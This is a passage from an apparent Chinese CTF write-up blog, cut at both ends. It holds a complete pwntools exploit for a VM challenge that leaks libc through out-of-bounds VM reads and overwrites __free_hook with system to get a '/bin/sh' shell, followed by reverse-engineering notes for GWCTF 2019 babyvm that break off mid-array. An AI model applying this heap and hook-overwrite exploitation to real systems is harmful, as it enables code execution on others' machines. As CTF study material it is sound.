ELF(&#x27;pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v2] + reg[v3]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_shift</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = memory[reg[v2]]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x30</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#memory[reg[v2]] = reg[v4]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x40</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg[v4] = (unsigned __int8)v2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setnum</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x10</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = [</span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">8</span>),  <span class="comment"># reg[0]=8</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xff</span>),  <span class="comment"># reg[1]=0xff</span></span><br><span class="line">    setnum(<span class="number">2</span>, <span class="number">0xff</span>),  <span class="comment"># reg[2]=0xff</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xc8</span>),  <span class="comment"># reg[1]=0xc8</span></span><br><span class="line">    <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">    read(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># reg[3]=memory[reg[2]]=memory[-56]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1]=-56+1=-55</span></span><br><span class="line">    read(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># reg[4]=memory[reg[2]]=memory[-55]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0x16</span>),  <span class="comment"># reg[1]=0x10</span></span><br><span class="line">    left_shift(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span></span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">0xb0</span>),  <span class="comment"># reg[0]=0x90</span></span><br><span class="line">    <span class="comment"># reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># reg[3]=reg[3]+reg[1]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">47</span>),  <span class="comment"># reg[1]=47</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+2=-55+47=-8</span></span><br><span class="line">    write(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-8]=reg[3]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+1=-8+1=-7</span></span><br><span class="line">    write(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-7]=reg[4]</span></span><br><span class="line">    u32((p8(<span class="number">0xff</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))[::-<span class="number">1</span>])  <span class="comment"># exit</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;PC: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;SP: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;SIZE: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R3: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">last_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&#x27;last_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(last_4bytes)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R4: &#x27;</span>)</span><br><span class="line">first_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">4</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;first_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(first_4bytes)))</span><br><span class="line"></span><br><span class="line">free_hook = (first_4bytes &lt;&lt; <span class="number">32</span>)+last_4bytes</span><br><span class="line">libc_base = free_hook-libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;free_hook =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;OVM?n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>由于程序只有一次写入和free的机会,并且写入和free用的是同一个指针</p><p>因此部署binsh和覆写system要在一次完成</p><p>故选择comment写为__free_hook-8,这样先写binsh,再写system,之后又触发free(comment)实际上就已经变成了system(‘/bin/sh’)</p><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><p>一道逆向VM题,头大</p><p>初始化操作,前四个模拟寄存器,unk_202060存存储指令码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nsigned __int64 __fastcall <span class="title function_">initt</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">18</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_B5F;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_A64;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_AC5;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_956;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_A08;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_8F0;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_99C;</span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F1,F2等操作码各自对应着函数</p><div class="table-container"><table><thead><tr><th>0xF1</th><th>实现mov操作</th></tr></thead><tbody><tr><td>0xF2</td><td>寄存器1异或寄存器2</td></tr><tr><td>0xF5</td><td>读入并判断长度</td></tr><tr><td>0xF4</td><td>nop</td></tr><tr><td>0xF7</td><td>寄存器1乘寄存器4</td></tr><tr><td>0xF8</td><td>寄存器1交换寄存器2</td></tr><tr><td>0xF6</td><td>寄存器1=2<em>寄存器2+3\</em>寄存器3+寄存器1</td></tr></tbody></table></div><p>提取出0x202060处的指令后脚本处理一下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">opcode=[<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span 